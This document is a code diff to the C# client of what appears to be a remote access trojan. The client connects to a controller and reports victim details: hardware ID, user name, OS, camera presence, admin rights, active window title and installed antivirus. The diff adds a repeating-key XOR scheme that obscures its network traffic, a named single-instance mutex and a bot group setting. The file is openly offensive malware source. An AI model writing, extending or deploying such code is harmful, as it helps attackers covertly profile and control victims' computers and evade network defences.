@@ -31,6 +31,9 @@ namespace Client
         public static readonly string IP = "127.0.0.1";
         public static readonly int Port = 8848;
         public static readonly string Version = "0.0.1";
+        public static readonly string Mutex = "qwqdanchun";
+        public static readonly string Group = "Default";
+        public static readonly string XorKey = "qwqdanchun";
         #endregion
 
         static void Main(string[] args)
@@ -79,16 +82,17 @@ namespace Client
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
             msgpack.ForcePathObject("HWID").AsString = HWID();
-            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
-            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
+            msgpack.ForcePathObject("User").AsString = Environment.UserName;
+            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.Replace("Microsoft", null) + " " + (Environment.Is64BitOperatingSystem? "64bit":"32bit");
             msgpack.ForcePathObject("Camera").AsString = havecamera().ToString();
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
-            msgpack.ForcePathObject("Version").AsString = "0.0.1";
+            msgpack.ForcePathObject("Version").AsString = Version;
             msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
             msgpack.ForcePathObject("Active").AsString = GetActiveWindowTitle();
             msgpack.ForcePathObject("AV").AsString = GetAV();
-            msgpack.ForcePathObject("Install").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
-            msgpack.ForcePathObject("Group").AsString = "Default";
+            msgpack.ForcePathObject("Install-Type").AsInteger = 0;//GetInstallType();
+            msgpack.ForcePathObject("Install-Time").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
+            msgpack.ForcePathObject("Group").AsString = Group;
             return msgpack.Encode2Bytes();
         }
 
@@ -403,7 +407,7 @@ namespace Client
             try
             {
                 MsgPack unpack_msgpack = new MsgPack();
-                unpack_msgpack.DecodeFromBytes((byte[])Data);
+                unpack_msgpack.DecodeFromBytes(Xor((byte[])Data));
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
 
@@ -439,7 +443,7 @@ namespace Client
                     {
                         using (MemoryStream MS = new MemoryStream())
                         {
-                            byte[] buffer = Msgs;
+                            byte[] buffer = Xor(Msgs);
                             byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
                             MS.Write(buffersize, 0, buffersize.Length);
                             MS.Write(buffer, 0, buffer.Length);
@@ -456,6 +460,25 @@ namespace Client
             }
         }
 
+        static byte[] Xor(byte[] buffer)
+        {
+            char[] key = XorKey.ToCharArray();
+            byte[] newByte = new byte[buffer.Length];
+
+            int j = 0;
+
+            for (int i = 0; i < buffer.Length; i++)
+            {
+                if (j == key.Length)
+                {
+                    j = 0;
+                }
+                newByte[i] = (byte)(buffer[i] ^ Convert.ToByte(key[j]));
+                j++;
+            }
+            return newByte;
+        }
+
         public static void EndSend(IAsyncResult ar)
         {
             try
@@ -468,6 +491,24 @@ namespace Client
             }
         }
 
-        #endregion        
+        #endregion
+
+        #region Mutex
+        public static Mutex currentApp;
+        public static bool CreateMutex()
+        {
+            bool createdNew;
+            currentApp = new Mutex(false, Mutex, out createdNew);
+            return createdNew;
+        }
+        public static void CloseMutex()
+        {
+            if (currentApp != null)
+            {
+                currentApp.Close();
+                currentApp = null;
+            }
+        }
+        #endregion
     }
 }
